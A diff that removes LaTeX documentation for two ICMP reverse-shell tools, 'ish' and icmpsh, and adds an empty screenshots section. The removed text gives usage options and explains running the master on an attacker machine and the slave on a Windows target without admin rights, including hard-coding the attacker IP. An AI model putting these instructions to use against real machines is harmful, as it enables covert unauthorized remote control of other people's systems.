-
-Usage: Client
-ICMP Shell v0.1 (client) - by: Peter Kieltyka
-usage: ./ish [options] <host>
-\vspace{lex} \newline
-options:
--i <id> Set session id; range: 0-65535 (default: 1515)
--t <type> Set ICMP type (default: 0)
--p <packetsize> Set packet size (default: 512)
-\vspace{lex} \newline
-example:
-./ish -i 65535 -t 0 -p 1024 host.com
-
-
-\section{icmpshell}
-icmpsh is a simple reverse ICMP shell with a win32 slave and a POSIX compatible master in C, Perl or Python. 
-The main advantage over the other similar open source tools is that it does not require administrative privileges to run onto the target machine.
-
-The tool is clean, easy and portable. 
-The slave (client) runs on the target Windows machine, it is written in C and works on Windows only whereas the master (server) can run on any platform on the attacker machine as it has been implemented in C and Perl by Nico Leidecker and I have ported it to Python too, hence this GitHub fork.
-
-
-Running the master
-The master is straight forward to use. 
-There are no extra libraries required for the C and Python versions. 
-The Perl master however has the following dependencies:
-\begin{itemize}
-    \item IO::Socket
-    \item NetPacket::IP
-    \item NetPacket::ICMP
-\end{itemize}
-When running the master, don't forget to disable ICMP replies by the OS. 
-For example: sysctl -w net.ipv4.icmp_echo_ignore_all=1
-If you miss doing that, you will receive information from the slave, but the slave is unlikely to receive commands send from the master.
-
-
-Running the slave
-The slave comes with a few command line options as outlined below:
--t host            host ip address to send ping requests to. This option is mandatory!
--r                 send a single test icmp request containing the string "Test1234" and then quit. 
-                   This is for testing the connection.
--d milliseconds    delay between requests in milliseconds 
--o milliseconds    timeout of responses in milliseconds. If a response has not received in time, 
-                   the slave will increase a counter of blanks. If that counter reaches a limit, the slave will quit.
-                   The counter is set back to 0 if a response was received.
--b num             limit of blanks (unanswered icmp requests before quitting)
--s bytes           maximal data buffer size in bytes
-In order to improve the speed, lower the delay (-d) between requests or increase the size (-s) of the data buffer.
-
-
-icmp-slave-complete.c : Hard coded values
-For the ease of execution, I have hard coded the values of target, delay, timeout, data buffer. 
-It will help to execute the binary directly without command line arguments.
-
-Check line number 186 to 197.
-\begin{itemize}
-    \item target: IP address of attacker's machine
-    \item delay: delay between requests in milliseconds
-    \item timeout: timeout in milliseconds
-    \item max_blanks: maximal number of blanks (unanswered icmp requests)
-    \item max_data_size: maximal data buffer size in bytes
-\end{itemize}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+\subsection{Screenshots}
+%TO-DO
 
 
 
